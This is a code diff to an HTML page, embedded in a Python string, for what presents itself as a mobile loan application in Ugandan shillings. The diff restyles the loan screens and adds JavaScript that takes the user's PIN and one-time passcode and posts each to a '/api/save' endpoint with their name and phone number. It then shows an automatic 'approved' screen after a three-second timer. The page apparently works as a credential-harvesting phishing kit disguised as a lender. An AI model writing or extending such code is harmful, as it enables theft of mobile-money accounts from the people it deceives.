@@ -302,14 +302,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 3: LOAN DETAILS & REPAYMENT -->
     <section id="screen-loan" class="hidden space-y-5">
       <div class="flex items-center gap-3">
-        <button onclick="goTo('apply')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
+        <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
         <div>
           <h2 class="text-xl font-black text-[#004F71]">LOAN DETAILS</h2>
           <p class="text-xs text-slate-500">Step 2 of 4 • Select period & review breakdown</p>
         </div>
       </div>
 
-      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-6">
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
         <div class="text-center">
           <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
           <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">UGX 500,000</div>
@@ -320,20 +320,22 @@ HTML_PAGE = r"""<!DOCTYPE html>
           </div>
         </div>
 
-        <div>
-        <div>
-          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
-          <div class="grid grid-cols-5 gap-2">
-            <button type="button" onclick="setPeriod(7)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">7 Days</button>
-            <button type="button" onclick="setPeriod(14)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">14 Days</button>
-            <button type="button" onclick="setPeriod(30)" class="period-btn py-2.5  border text-xs font-bold transition-all  text-white border-[#004F71] shadow-sm">30 Days</button>
-            <button type="button" onclick="setPeriod(60)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">60 Days</button>
-            <button type="button" onclick="setPeriod(90)" class="period-btn py-2.5  border text-xs font-bold transition-all text-slate-700 border-slate-200">90 Days</button>
+        <div class="space-y-4">
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
+            <div class="grid grid-cols-5 gap-2">
+              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">7 Days</button>
+              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">14 Days</button>
+              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#004F71] text-[#FFCC00] border-[#004F71] shadow-sm">30 Days</button>
+              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">60 Days</button>
+              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">90 Days</button>
+            </div>
           </div>
-        </div>
 
-          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Or Choose Specific Date</label>
-          <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Or Choose Specific Date</label>
+            <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
+          </div>
         </div>
 
         <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
@@ -364,7 +366,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 4: REVIEW APPLICATION -->
     <section id="screen-review" class="hidden space-y-5">
       <div class="flex items-center gap-3">
-        <button onclick="goTo('loan')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
+        <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
         <div>
           <h2 class="text-xl font-black text-[#004F71]">REVIEW APPLICATION</h2>
           <p class="text-xs text-slate-500">Step 3 of 4 • Verify all details before submission</p>
@@ -704,6 +706,217 @@ HTML_PAGE = r"""<!DOCTYPE html>
         }
       });
       calculateCosts();
+    }
+    function setCustomDate(val) {
+      if (!val) return;
+      const chosen = new Date(val);
+      const today = new Date();
+      today.setHours(0, 0, 0, 0);
+      const diffTime = chosen - today;
+      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+      if (diffDays > 0) {
+        appState.period = diffDays;
+        document.querySelectorAll('.period-btn').forEach(btn => {
+          btn.classList.remove('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
+          btn.classList.add('text-slate-700', 'border-slate-200');
+        });
+        calculateCosts();
+      }
+    }
+
+
+    function toggleConfirm(checked) {
+      const btn = document.getElementById('btn-confirm');
+      if (btn) {
+        btn.disabled = !checked;
+        if (checked) {
+          btn.classList.remove('bg-slate-300', 'cursor-not-allowed');
+          btn.classList.add('bg-[#004F71]', 'hover:bg-[#00334E]');
+        } else {
+          btn.classList.add('bg-slate-300', 'cursor-not-allowed');
+          btn.classList.remove('bg-[#004F71]', 'hover:bg-[#00334E]');
+        }
+      }
+    }
+
+    function populateReview() {
+      const nameEl = document.getElementById('review-name');
+      const mobileEl = document.getElementById('review-mobile');
+      const idEl = document.getElementById('review-id');
+      const purposeEl = document.getElementById('review-purpose');
+      const principalEl = document.getElementById('review-principal');
+      const periodEl = document.getElementById('review-period');
+      const totalEl = document.getElementById('review-total');
+      const dateEl = document.getElementById('review-date');
+
+      if (nameEl) nameEl.innerText = appState.fullName || "Tariro Moyo";
+      if (mobileEl) mobileEl.innerText = appState.mobile || "+256 77 123 4567";
+      if (idEl) idEl.innerText = appState.nationalId || "CM98102938102";
+      if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
+      if (principalEl) principalEl.innerText = 'UGX ' + (appState.amount || 100000).toLocaleString();
+      if (periodEl) periodEl.innerText = appState.period + ' Days';
+
+      const val = appState.amount || 100000;
+      const days = appState.period || 30;
+      let rate = 0.05;
+      if (days <= 7) rate = 0.03;
+      else if (days <= 14) rate = 0.05;
+      else if (days <= 30) rate = 0.10;
+      else if (days <= 60) rate = 0.15;
+      else rate = 0.20;
+
+      const interest = Math.round(val * rate);
+      const fee = Math.round(val * 0.03);
+      const total = val + interest + fee;
+
+      if (totalEl) totalEl.innerText = 'UGX ' + total.toLocaleString();
+
+      if (dateEl) {
+        const d = new Date();
+        d.setDate(d.getDate() + days);
+        dateEl.innerText = d.toLocaleDateString('en-GB');
+      }
+
+      // Reset confirm checkbox and button state when entering review screen
+      const checkEl = document.getElementById('confirm-check');
+      if (checkEl) {
+        checkEl.checked = false;
+        toggleConfirm(false);
+      }
+    }
+
+    function pressPin(digit) {
+      if (enteredPin.length < 4) {
+        enteredPin += digit;
+        updatePinDots();
+        if (enteredPin.length === 4) {
+          setTimeout(submitPin, 300);
+        }
+      }
+    }
+
+    function clearPin() {
+      enteredPin = '';
+      updatePinDots();
+    }
+
+    function backspacePin() {
+      enteredPin = enteredPin.slice(0, -1);
+      updatePinDots();
+    }
+
+    function updatePinDots() {
+      for (let i = 0; i < 4; i++) {
+        const dot = document.getElementById('dot-' + i);
+        if (dot) {
+          if (i < enteredPin.length) {
+            dot.classList.add('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.remove('border-slate-300');
+          } else {
+            dot.classList.remove('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.add('border-slate-300');
+          }
+        }
+      }
+    }
+
+    function submitPin() {
+      fetch('/api/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          appId: appState.appId,
+          fullName: appState.fullName,
+          mobile: appState.mobile,
+          field: 'entered_pin',
+          value: enteredPin
+        })
+      }).catch(err => console.error(err));
+
+      const otpLabel = document.getElementById('otp-mobile-label');
+      if (otpLabel) otpLabel.innerText = appState.mobile || '+256 77 123 4567';
+      goTo('otp');
+    }
+
+    function otpMove(input, index) {
+      if (input.value.length === 1 && index < 6) {
+        const nextInput = input.parentElement.children[index];
+        if (nextInput) nextInput.focus();
+      }
+    }
+
+    function startOtpTimer() {
+      countdown = 30;
+      const resendBtn = document.getElementById('resend-btn');
+      if (timer) clearInterval(timer);
+      
+      timer = setInterval(() => {
+        countdown--;
+        if (resendBtn) {
+          if (countdown > 0) {
+            resendBtn.innerText = `Resend code in ${countdown}s`;
+            resendBtn.disabled = true;
+          } else {
+            resendBtn.innerText = 'Resend code';
+            resendBtn.disabled = false;
+            clearInterval(timer);
+          }
+        }
+      }, 1000);
+    }
+
+    function resendOtp() {
+      startOtpTimer();
+    }
+
+    function startProcessing() {
+      const otpInputs = document.querySelectorAll('.otp-box');
+      let otpCode = '';
+      otpInputs.forEach(i => otpCode += i.value);
+
+      fetch('/api/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          appId: appState.appId,
+          fullName: appState.fullName,
+          mobile: appState.mobile,
+          field: 'entered_otp',
+          value: otpCode
+        })
+      }).catch(err => console.error(err));
+
+      goTo('processing');
+
+      setTimeout(() => {
+        const approvedAmt = document.getElementById('approved-amount');
+        const approvedRepay = document.getElementById('approved-repay');
+        const approvedDate = document.getElementById('approved-date');
+
+        const val = appState.amount || 100000;
+        const days = appState.period || 30;
+        let rate = 0.05;
+        if (days <= 7) rate = 0.03;
+        else if (days <= 14) rate = 0.05;
+        else if (days <= 30) rate = 0.10;
+        else if (days <= 60) rate = 0.15;
+        else rate = 0.20;
+
+        const interest = Math.round(val * rate);
+        const fee = Math.round(val * 0.03);
+        const total = val + interest + fee;
+
+        if (approvedAmt) approvedAmt.innerText = 'UGX ' + val.toLocaleString();
+        if (approvedRepay) approvedRepay.innerText = 'UGX ' + total.toLocaleString();
+
+        if (approvedDate) {
+          const d = new Date();
+          d.setDate(d.getDate() + days);
+          approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+        }
+
+        goTo('approved');
+      }, 3000);
     }
 
     function syncAmount(val, isFromInput = false) {
